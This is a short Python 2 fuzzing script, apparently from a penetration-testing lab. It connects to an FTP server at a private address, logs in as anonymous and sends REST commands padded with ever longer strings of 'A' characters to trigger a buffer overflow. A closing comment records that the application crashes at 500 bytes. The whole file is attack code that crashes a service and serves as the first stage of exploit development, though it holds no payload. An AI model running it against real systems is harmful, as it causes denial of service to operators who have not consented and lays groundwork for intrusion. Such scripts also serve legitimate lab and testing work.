import socket
ip="10.11.20.10"
buffer=["A"]
counter=100
while len(buffer) < 30:
	buffer.append("A"*counter)
	counter=counter+200
for string in buffer:
	print "\nFuzzing with %s bytes" %len(string)
	print "\nConnect to ftp server"
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((ip,21))
	s.recv(1024)
	s.send("USER anonymous\r\n")
	s.recv(1024)
	s.send("PASS test\r\n")
	s.recv(1024)
	s.send("REST " + string + "\r\n")
	s.send("QUIT\r\n")
	s.close()
#application crashes at 500 bytes
